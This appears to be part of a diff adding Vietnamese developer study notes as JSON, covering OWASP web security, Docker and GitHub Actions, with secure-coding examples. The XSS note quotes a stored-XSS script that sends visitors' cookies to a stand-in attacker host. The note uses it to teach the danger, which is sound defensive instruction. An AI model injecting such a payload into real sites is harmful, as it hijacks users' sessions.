+    "content": "Ô bình luận trên một trang cho phép nhập text tự do. Một người dùng gõ `<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>` thay vì bình luận bình thường, và từ đó, mọi người mở lại trang đều tự động chạy đoạn script đánh cắp cookie của chính họ.\n\n## Ba dạng XSS\n\n- **Stored**: script được lưu trong database (như ví dụ trên), chạy với mọi người xem lại trang sau này.\n- **Reflected**: script nằm ngay trong URL, chỉ chạy khi nạn nhân bấm vào đúng link độc hại đó.\n- **DOM-based**: không qua server — JavaScript phía client tự ghép dữ liệu không an toàn (như `location.hash`) thẳng vào DOM.\n\n## Nguyên tắc: escape theo ngữ cảnh xuất dữ liệu\n\n```tsx\n// An toàn: React tự escape khi render text thường\nfunction Comment({ text }: { text: string }) {\n  return <p>{text}</p> // \"<script>\" hiển thị như chữ, trình duyệt không chạy nó\n}\n\n// Nguy hiểm: bỏ qua cơ chế escape của framework\nfunction CommentRaw({ html }: { html: string }) {\n  return <p dangerouslySetInnerHTML={{ __html: html }} /> // script bên trong sẽ thực sự chạy\n}\n```\n\n## Ghi nhớ\n\n- Escape đúng ngữ cảnh: text trong HTML, thuộc tính HTML, URL và JavaScript mỗi loại cần cách escape riêng.\n- Framework hiện đại (React, Vue) tự escape khi render text bình thường; chỉ mất an toàn khi chủ động dùng API \"raw HTML\".\n- Bắt buộc render HTML do người dùng nhập thì phải lọc qua thư viện sanitize (như DOMPurify), không tự viết regex để lọc thẻ.",
+    "tags": [
+      "owasp",
+      "xss"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-loi-kiem-soat-truy-cap",
+    "topicId": "topic-owasp",
+    "title": "Lỗi kiểm soát truy cập",
+    "slug": "loi-kiem-soat-truy-cap",
+    "summary": "Kiểm tra quyền ở server cho từng bản ghi, không tin vào việc ẩn nút trên giao diện.",
+    "content": "Giao diện chỉ hiện nút \"Xoá\" cho admin, người dùng thường không thấy nút đó nên coi như đã \"khoá\" tính năng. Nhưng ai đó mở DevTools, sao chép request, rồi gọi thẳng `DELETE /api/notes/123` bằng `curl` — và ghi chú của người khác bị xoá, vì phía server không hề kiểm tra lại quyền.\n\n## Kiểm tra quyền phải nằm ở server\n\n```ts\nexport async function DELETE(req: Request, { params }: { params: { id: string } }) {\n  const session = await getSession(req)\n  if (!session) return new Response('Unauthorized', { status: 401 })\n\n  const note = await notesRepo.findById(params.id)\n  if (!note || note.ownerId !== session.userId) {\n    return new Response('Forbidden', { status: 403 })\n  }\n\n  await notesRepo.remove(params.id)\n  return new Response(null, { status: 204 })\n}\n```\n\nẨn nút trên giao diện chỉ ngăn người dùng bình thường bấm nhầm; nó không ngăn ai đó gọi thẳng API.\n\n## Kiểm tra theo từng bản ghi, không chỉ theo vai trò\n\nNhiều hệ thống chỉ kiểm tra \"đã đăng nhập\" hoặc `role === 'admin'` rồi coi như đủ. Nhưng một user thường vẫn cần sửa được ghi chú *của chính họ* — route đó phải so khớp `note.ownerId` với người đang đăng nhập cho từng request, không phải chỉ kiểm tra một lần ở tầng vai trò chung.\n\n## Ghi nhớ\n\n- Ẩn nút trên giao diện là UX, không phải bảo mật — mọi endpoint phải tự kiểm tra quyền phía server.\n- Kiểm tra theo từng bản ghi (record-level), không chỉ theo vai trò chung chung.\n- Mặc định từ chối: chỉ cho phép sau khi đã xác nhận đúng chủ sở hữu hoặc quyền cụ thể.",
+    "tags": [
+      "owasp",
+      "phan-quyen"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-luu-mat-khau-dung-cach",
+    "topicId": "topic-owasp",
+    "title": "Lưu mật khẩu đúng cách",
+    "slug": "luu-mat-khau-dung-cach",
+    "summary": "Vì sao phải hash chậm có salt, và vì sao đừng tự nghĩ ra thuật toán.",
+    "content": "Database bị rò rỉ. Vì mật khẩu được lưu bằng MD5 không salt, kẻ tấn công tra ngược qua rainbow table có sẵn trên mạng và có lại mật khẩu gốc của hàng loạt tài khoản chỉ trong vài giây — MD5 vốn được thiết kế để chạy cực nhanh, đúng thứ không nên có khi hash mật khẩu.\n\n## Hash chậm có salt, không phải hash nhanh\n\n```ts\nimport bcrypt from 'bcrypt'\n\nconst matKhau = 'hunter2'\nconst hash = await bcrypt.hash(matKhau, 12) // 12: cost factor, càng cao càng chậm và càng khó brute-force\nconst isValid = await bcrypt.compare(matKhau, hash) // true\nconst isSaiMatKhau = await bcrypt.compare('sai-mat-khau', hash) // false\n```\n\n`bcrypt` tự sinh salt ngẫu nhiên cho từng lần hash và cố tình chạy chậm — GPU không thể thử hàng tỷ khả năng mỗi giây như với MD5/SHA1 trần.\n\n## Đừng tự nghĩ ra thuật toán\n\nTự chế cách \"làm rối\" mật khẩu (đảo chuỗi, XOR, hash tay nhiều lớp...) hầu như luôn yếu hơn thuật toán đã được cộng đồng bảo mật kiểm chứng qua nhiều năm, vì thiếu kinh nghiệm đối phó với các kiểu tấn công đã biết.\n\n## Ghi nhớ\n\n- Không bao giờ lưu mật khẩu dạng plain text hay hash nhanh trần (MD5, SHA1, SHA256 không salt).\n- Dùng `bcrypt` hoặc `argon2` — hash chậm, tự sinh salt ngẫu nhiên riêng cho từng mật khẩu.\n- Cost factor cao hơn thì an toàn hơn nhưng chậm hơn — chọn mức vẫn chấp nhận được cho thời gian đăng nhập.",
+    "tags": [
+      "owasp",
+      "mat-khau",
+      "hashing"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-quan-ly-secret-va-bien-moi-truong",
+    "topicId": "topic-owasp",
+    "title": "Quản lý secret và biến môi trường",
+    "slug": "quan-ly-secret-va-bien-moi-truong",
+    "summary": "Không commit secret, phân biệt biến chỉ ở server với biến lộ ra client.",
+    "content": "Khoá API của dịch vụ thanh toán bị commit thẳng vào code, đẩy lên một repository công khai trên GitHub. Chỉ vài phút sau, bot tự động quét repository công khai đã tìm ra khoá đó và bắt đầu dùng thử.\n\n## Không commit secret vào git\n\n```bash\n# .env (không commit — thêm vào .gitignore)\nDATABASE_URL=postgres://user:pass@localhost:5432/db\nSTRIPE_SECRET_KEY=sk_live_xxx\n```\n\n```bash\n# .gitignore\n.env\n.env.local\n```\n\nSecret nên nằm trong biến môi trường (hoặc secret manager của nền tảng deploy), không bao giờ nằm trong file được commit.\n\n## Server-only và biến lộ ra client\n\n```ts\n// Chỉ đọc được ở server: route handler, Server Component, Server Action\nconst secretKey = process.env.STRIPE_SECRET_KEY\n\n// Biến NEXT_PUBLIC_* được đóng gói thẳng vào bundle JS gửi cho trình duyệt\nconst publicKey = process.env.NEXT_PUBLIC_STRIPE_KEY\n```\n\nỞ Next.js, bất kỳ biến nào đặt tên bắt đầu bằng `NEXT_PUBLIC_` đều bị nhúng vào mã nguồn phía client — ai mở DevTools cũng đọc được, nên tuyệt đối không đặt secret thật dưới tên đó.\n\n## Ghi nhớ\n\n- Secret không bao giờ nằm trong code hay bị commit vào git — dùng biến môi trường hoặc secret manager.\n- Ở Next.js, chỉ biến bắt đầu bằng `NEXT_PUBLIC_` mới lộ ra trình duyệt; secret thật phải đặt tên khác.\n- Nếu secret lỡ bị commit, phải xoay vòng (rotate) khoá mới ngay — xoá khỏi lịch sử git không đủ, khoá cũ coi như đã lộ vĩnh viễn.",
+    "tags": [
+      "owasp",
+      "secret"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-dockerfile-nhieu-stage",
+    "topicId": "topic-docker",
+    "title": "Dockerfile nhiều stage",
+    "slug": "dockerfile-nhieu-stage",
+    "summary": "Tách stage build và stage chạy để image nhỏ hơn và ít lỗ hổng hơn.",
+    "content": "Build một app Node.js bằng Dockerfile một stage duy nhất — kết quả là image nặng cả gigabyte, dù code thực sự chạy chỉ vài chục megabyte. Toàn bộ devDependencies, TypeScript compiler, và cache cài đặt đều bị kẹt lại trong image production.\n\n## Một stage: mọi thứ bị gộp vào image cuối\n\n```dockerfile\nFROM node:20\nWORKDIR /app\nCOPY . .\nRUN npm install && npm run build\nCMD [\"npm\", \"start\"]\n```\n\nImage này chứa nguyên vẹn `devDependencies`, source TypeScript gốc, và toàn bộ cache của `npm install` — không thứ nào trong đó cần thiết lúc chạy `npm start`.\n\n## Multi-stage: tách build và runtime\n\n```dockerfile\n# Stage 1: cài đủ công cụ để build\nFROM node:20 AS builder\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci\nCOPY . .\nRUN npm run build\n\n# Stage 2: chỉ giữ những gì cần để chạy\nFROM node:20-slim AS runner\nWORKDIR /app\nCOPY --from=builder /app/package*.json ./\nCOPY --from=builder /app/node_modules ./node_modules\nCOPY --from=builder /app/dist ./dist\nCMD [\"node\", \"dist/main.js\"]\n```\n\n`COPY --from=builder` chỉ lấy đúng file cần thiết từ stage trước sang stage cuối; mọi thứ khác của stage `builder` (TypeScript compiler, source gốc, cache) bị bỏ lại, không nằm trong image cuối cùng.\n\n## Ghi nhớ\n\n- Stage build cài đủ công cụ để biên dịch; stage runtime chỉ copy đúng file cần chạy qua `COPY --from=`.\n- Image nhỏ hơn tải nhanh hơn, và ít công cụ hơn nghĩa là ít bề mặt tấn công hơn.\n- `devDependencies` (TypeScript, ESLint, test runner...) không nên có mặt trong image chạy production.",
+    "tags": [
+      "docker",
+      "dockerfile"
+    ],
+    "starred": true,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-volume-va-bind-mount",
+    "topicId": "topic-docker",
+    "title": "Volume và bind mount",
+    "slug": "volume-va-bind-mount",
+    "summary": "Hai cách giữ dữ liệu sống lâu hơn container, dùng cái nào cho việc gì.",
+    "content": "Container database bị xoá để cập nhật image mới, và toàn bộ dữ liệu bên trong biến mất theo — vì mọi thứ ghi vào filesystem của container chỉ tồn tại đúng vòng đời của container đó.\n\n## Volume: Docker tự quản lý nơi lưu\n\n```bash\ndocker volume create pgdata\ndocker run -d --name db -v pgdata:/var/lib/postgresql/data postgres:16\n```\n\nXoá container `db` rồi tạo lại với cùng `-v pgdata:/var/lib/postgresql/data`, dữ liệu vẫn còn nguyên — nó nằm trong volume do Docker quản lý, tách biệt khỏi vòng đời của container.\n\n## Bind mount: gắn thẳng thư mục trên máy host\n\n```bash\ndocker run -d --name app -v \"$(pwd)/src:/app/src\" node:20 npm run dev\n```\n\nSửa file trong `./src` trên máy host phản ánh ngay vào container đang chạy — hữu ích khi dev cần hot reload, nhưng phụ thuộc cấu trúc thư mục cụ thể của máy host nên ít phù hợp cho production.\n\n## Ghi nhớ\n\n- Volume: Docker quản lý vị trí lưu, phù hợp cho dữ liệu cần bền (database) và chạy production.\n- Bind mount: gắn thẳng thư mục host vào container, phù hợp cho dev để sửa code không cần build lại image.\n- Cả hai đều giữ dữ liệu sống ngoài vòng đời container — khác với dữ liệu ghi trực tiếp vào filesystem container, sẽ mất khi container bị xoá.",
+    "tags": [
+      "docker",
+      "volume"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-docker-compose-cho-moi-truong-dev",
+    "topicId": "topic-docker",
+    "title": "docker compose cho môi trường dev",
+    "slug": "docker-compose-cho-moi-truong-dev",
+    "summary": "Dựng app kèm database bằng một file yaml và một lệnh.",
+    "content": "Môi trường dev cần app, Postgres và đúng biến kết nối giữa chúng chạy cùng lúc. Chạy tay ba lệnh `docker run` với đúng network, đúng port, đúng thứ tự khởi động mỗi lần onboarding một thành viên mới — rất dễ quên một cờ và mất cả buổi debug vì sao app không kết nối được database.\n\n## Định nghĩa nhiều service trong một file\n\n```yaml\nservices:\n  app:\n    build: .\n    ports:\n      - '3000:3000'\n    environment:\n      DATABASE_URL: postgres://postgres:postgres@db:5432/app\n    depends_on:\n      - db\n  db:\n    image: postgres:16\n    environment:\n      POSTGRES_PASSWORD: postgres\n    ports:\n      - '5432:5432'\n    volumes:\n      - pgdata:/var/lib/postgresql/data\n\nvolumes:\n  pgdata:\n```\n\n`app` kết nối tới `db` bằng đúng tên service (`db`) làm hostname — Compose tự tạo network nội bộ giữa các service, không cần biết IP thật của container.\n\n## Một lệnh cho toàn bộ môi trường\n\n```bash\ndocker compose up -d\ndocker compose down\n```\n\n`up -d` dựng và chạy nền toàn bộ service theo đúng thứ tự `depends_on`; `down` dừng và dọn sạch container (dữ liệu trong `volumes` vẫn giữ nguyên trừ khi thêm cờ `-v`).\n\n## Ghi nhớ\n\n- Mỗi service trong `docker-compose.yml` là một container, gọi nhau bằng tên service làm hostname.\n- `docker compose up -d` dựng toàn bộ môi trường bằng một lệnh, `down` dọn sạch.\n- Khai báo `volumes:` cho service cần giữ dữ liệu qua các lần `docker compose down`/`up`.",
+    "tags": [
+      "docker",
+      "compose"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-cau-truc-mot-workflow-github-actions",
+    "topicId": "topic-cicd",
+    "title": "Cấu trúc một workflow GitHub Actions",
+    "slug": "cau-truc-mot-workflow-github-actions",
+    "summary": "trigger, job, step, runner — bộ khung tối thiểu của một file workflow.",
+    "content": "PR mở lên, ai đó quên chạy test ở máy mình, code lỗi vẫn được merge vào `main` — không có ai đứng canh, cần một cơ chế tự động chặn việc đó trước khi merge được phép xảy ra.\n\n## Bộ khung: trigger, job, step, runner\n\n```yaml\nname: CI\n\non:\n  push:\n    branches: [main]\n  pull_request:\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n      - run: npm ci\n      - run: npm test\n```\n\nWorkflow này chạy mỗi khi có `push` vào `main` hoặc mở `pull_request`, tải code, cài Node 20, cài dependency rồi chạy test.\n\n## Bốn khái niệm\n\n- **trigger** (`on`): sự kiện khởi động workflow — `push`, `pull_request`, lịch chạy định kỳ...\n- **job**: một nhóm `steps` chạy trên cùng một máy ảo (`runs-on`); nhiều job không phụ thuộc nhau chạy song song mặc định.\n- **step**: từng lệnh hoặc action trong job, luôn chạy tuần tự từ trên xuống.\n- **runner**: máy ảo GitHub cấp phát để chạy job, ví dụ `ubuntu-latest`.\n\n## Ghi nhớ\n\n- `on` định nghĩa khi nào chạy, `jobs` định nghĩa chạy gì; mỗi job chạy trên một runner riêng.\n- Job không khai báo `needs` sẽ chạy song song, không tuần tự.\n- Step dùng `uses` để gọi action có sẵn, dùng `run` để chạy thẳng lệnh shell.",
+    "tags": [
+      "ci-cd",
+      "github-actions"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-cache-dependency-trong-ci",
+    "topicId": "topic-cicd",
+    "title": "Cache dependency trong CI",
+    "slug": "cache-dependency-trong-ci",
+    "summary": "Cache pnpm store để job không cài lại toàn bộ package mỗi lần chạy.",
+    "content": "Mỗi lần push, CI mất vài phút chỉ để cài lại toàn bộ `node_modules` từ đầu — tải lại đúng những package không hề đổi so với lần chạy trước, trong khi thời gian đó cộng dồn lại là hàng giờ chờ đợi mỗi tuần.\n\n## Cache thư mục store của pnpm\n\n```yaml\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: pnpm/action-setup@v4\n        with:\n          version: 9\n      - uses: actions/setup-node@v4\n        with:\n          node-version: 20\n          cache: 'pnpm'\n      - run: pnpm install --frozen-lockfile\n      - run: pnpm test\n```\n\n`cache: 'pnpm'` trong `setup-node` tự khoá cache theo hash của `pnpm-lock.yaml` — lockfile không đổi thì lấy lại cache cũ, lockfile đổi thì tự cài mới từ đầu.\n\n## Tự khai báo cache khi cần kiểm soát chi tiết hơn\n\n```yaml\n- uses: actions/cache@v4\n  with:\n    path: ~/.local/share/pnpm/store\n    key: pnpm-store-${{ hashFiles('pnpm-lock.yaml') }}\n```\n\n`key` gắn trực tiếp với nội dung lockfile: chỉ cần một dòng trong `pnpm-lock.yaml` đổi, key đổi theo và cache cũ tự động không còn được dùng.\n\n## Ghi nhớ\n\n- Cache theo key gắn với hash của lockfile: lockfile đổi thì cache tự vô hiệu, không dùng nhầm dependency cũ.\n- `pnpm install --frozen-lockfile` (hay `npm ci`) đảm bảo CI cài đúng phiên bản đã lock, không tự ý cập nhật.\n- Cache dependency đã tải, không cache kết quả build cuối cùng — hai thứ khác mục đích.",
+    "tags": [
+      "ci-cd",
+      "cache"
+    ],
+    "starred": false,
+    "createdAt": "2026-08-17T00:00:00.000Z",
+    "updatedAt": "2026-08-17T00:00:00.000Z"
+  },
+  {
+    "id": "note-secret-trong-github-actions",
+    "topicId": "topic-cicd",
+    "title": "Secret trong GitHub Actions",
+    "slug": "secret-trong-github-actions",
+    "summary": "Cách truyền khoá vào workflow an toàn và những chỗ secret dễ bị lộ.",
+    "content": "Khoá deploy được viết thẳng vào file workflow `.yml` rồi commit vào git — ai đọc lại lịch sử repository, kể cả sau khi đã sửa xoá dòng đó ở commit sau, vẫn thấy được khoá cũ nằm nguyên trong lịch sử.\n\n## Khai báo secret ở repository, dùng qua context secrets\n\n```yaml\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Deploy\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n        run: ./scripts/deploy.sh\n```\n\nSecret khai ở Settings > Secrets and variables > Actions của repository, không nằm trong file yaml. GitHub tự động che giá trị secret bằng `***` trong log, kể cả khi nó vô tình bị in ra.\n\n## Những chỗ secret dễ bị lộ\n\n- Nối secret thẳng vào chuỗi lệnh thay vì truyền qua `env` — luôn dùng `env:`, đừng viết `run: curl -H \"Authorization: ${{ secrets.DEPLOY_TOKEN }}\"` trực tiếp trong `run`.\n- Workflow chạy trên `pull_request` từ fork bên ngoài mặc định không thấy secret của repo gốc — cố tình bỏ qua giới hạn này (ví dụ đổi sang `pull_request_target` mà không cẩn thận) mới là nơi rò rỉ thật sự.\n- Secret bị `echo` ra trong bước debug tạm thời rồi quên xoá trước khi merge.\n\n## Ghi nhớ\n\n- Secret khai báo ở Settings của repository, tham chiếu bằng `${{ secrets.TEN_SECRET }}`, không bao giờ hardcode trong file workflow.\n- Luôn truyền secret qua `env`, không nối trực tiếp vào chuỗi lệnh của `run`.\n- `pull_request` từ fork ngoài mặc định không thấy được secret của repo gốc — đây là cơ chế bảo vệ, không phải giới hạn cần né tránh.",
+    "tags": [
+      "ci-cd",
+      "secret"
+    ],
+    "starred": false,
     "createdAt": "2026-08-17T00:00:00.000Z",
     "updatedAt": "2026-08-17T00:00:00.000Z"
   }
